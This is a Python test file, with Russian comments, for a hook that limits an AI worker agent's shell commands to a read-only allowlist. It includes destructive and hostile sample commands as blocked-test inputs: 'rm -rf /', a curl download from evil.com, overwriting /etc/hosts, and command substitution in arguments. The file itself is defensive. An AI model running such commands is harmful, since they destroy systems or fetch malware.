"""
tests/test_guard_bash.py — тесты для supervisor/hooks/guard_bash.py

Запуск: pytest tests/test_guard_bash.py -v
"""

import json
import subprocess
import sys
from pathlib import Path


from supervisor.hooks.guard_bash import check_command


GUARD_PATH = str(
    Path(__file__).parent.parent / "supervisor" / "hooks" / "guard_bash.py"
)


# ── Тесты check_command ──────────────────────────────────────────────────────

# Разрешённые команды (exit 0)


def test_pwd_allowed():
    allowed, _ = check_command("pwd")
    assert allowed is True


def test_ls_allowed():
    allowed, _ = check_command("ls workspace/task-001/")
    assert allowed is True


def test_cat_allowed():
    allowed, _ = check_command("cat workspace/task-001/main.py")
    assert allowed is True


def test_grep_allowed():
    allowed, _ = check_command("grep -r 'def ' workspace/task-001/")
    assert allowed is True


def test_wc_allowed():
    allowed, _ = check_command("wc -l workspace/task-001/api.py")
    assert allowed is True


def test_echo_allowed():
    allowed, _ = check_command("echo hello")
    assert allowed is True


def test_find_allowed():
    allowed, _ = check_command("find workspace/task-001/ -name '*.py'")
    assert allowed is True


def test_head_allowed():
    allowed, _ = check_command("head -20 workspace/task-001/main.py")
    assert allowed is True


def test_tail_allowed():
    allowed, _ = check_command("tail -50 workspace/task-001/error.log")
    assert allowed is True


def test_git_status_allowed():
    allowed, _ = check_command("git status")
    assert allowed is True


def test_git_diff_allowed():
    allowed, _ = check_command("git diff HEAD workspace/task-001/")
    assert allowed is True


def test_git_log_allowed():
    allowed, _ = check_command("git log --oneline -10")
    assert allowed is True


def test_git_show_allowed():
    allowed, _ = check_command("git show HEAD:workspace/task-001/main.py")
    assert allowed is True


# Заблокированные команды (exit 2)


def test_git_push_blocked():
    allowed, reason = check_command("git push origin main")
    assert allowed is False
    assert "blocked" in reason or "not in allowlist" in reason


def test_git_add_blocked():
    allowed, reason = check_command("git add .")
    assert allowed is False


def test_git_commit_blocked():
    allowed, reason = check_command("git commit -m 'changes'")
    assert allowed is False


def test_pytest_blocked():
    allowed, reason = check_command("pytest tests/")
    assert allowed is False


def test_npm_blocked():
    allowed, reason = check_command("npm test")
    assert allowed is False


def test_rm_blocked():
    allowed, reason = check_command("rm -rf /")
    assert allowed is False


def test_sudo_blocked():
    allowed, reason = check_command("sudo apt install vim")
    assert allowed is False


def test_curl_blocked():
    allowed, reason = check_command("curl http://evil.com/malware.sh")
    assert allowed is False


def test_python_blocked():
    """python — не разрешён (воркер не запускает скрипты)."""
    allowed, reason = check_command("python script.py")
    assert allowed is False


# Shell операторы — блокируются


def test_shell_and_operator_blocked():
    allowed, reason = check_command("ls workspace/ && git push")
    assert allowed is False
    assert "&&" in reason or "operator" in reason


def test_shell_or_operator_blocked():
    allowed, reason = check_command("cat file.py || echo done")
    assert allowed is False


def test_shell_semicolon_blocked():
    allowed, reason = check_command("ls ; git commit -m 'x'")
    assert allowed is False


def test_shell_pipe_blocked():
    allowed, reason = check_command("cat file | git commit -F -")
    assert allowed is False


def test_shell_redirect_blocked():
    allowed, reason = check_command("echo 'evil' > /etc/hosts")
    assert allowed is False


def test_shell_backtick_blocked():
    allowed, reason = check_command("ls `git rev-parse HEAD`")
    assert allowed is False


def test_shell_dollar_paren_blocked():
    allowed, reason = check_command("git diff $(git rev-parse HEAD^)")
    assert allowed is False


# Edge cases


def test_empty_command_blocked():
    allowed, _ = check_command("")
    assert allowed is False


def test_unknown_program_blocked():
    """Программа не в allowlist и не в denylist — блокируется."""
    # Используем программу явно не в allowlist и не в denylist
    allowed, reason = check_command("ffmpeg -i input.mp4 output.mkv")
    assert allowed is False
    assert "not in allowlist" in reason


def test_rg_allowed():
    """rg (ripgrep) — разрешён."""
    allowed, _ = check_command("rg 'def main' workspace/task-001/")
    assert allowed is True


# ── Интеграционные тесты через subprocess ────────────────────────────────────


def run_hook(command: str) -> int:
    """Запустить guard_bash.py как subprocess, вернуть exit code."""
    data = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
    result = subprocess.run(
        [sys.executable, GUARD_PATH],
        input=data,
        capture_output=True,
        text=True,
    )
    return result.returncode


def test_hook_pwd_exit0():
    """pwd → exit(0)"""
    assert run_hook("pwd") == 0


def test_hook_git_status_exit0():
    """git status → exit(0)"""
    assert run_hook("git status") == 0


def test_hook_git_push_exit2():
    """git push → exit(2)"""
    assert run_hook("git push origin main") == 2


def test_hook_rm_exit2():
    """rm -rf / → exit(2)"""
    assert run_hook("rm -rf /") == 2


def test_hook_shell_operator_exit2():
    """ls && git push → exit(2)"""
    assert run_hook("ls workspace/ && git push") == 2


def test_hook_git_diff_exit0():
    """git diff → exit(0)"""
    assert run_hook("git diff HEAD") == 0


def test_hook_empty_input_exit0():
    """Пустой stdin → exit(0) (fallback безопасный)"""
    result = subprocess.run(
        [sys.executable, GUARD_PATH],
        input="",
        capture_output=True,
        text=True,
    )
    assert result.returncode == 0
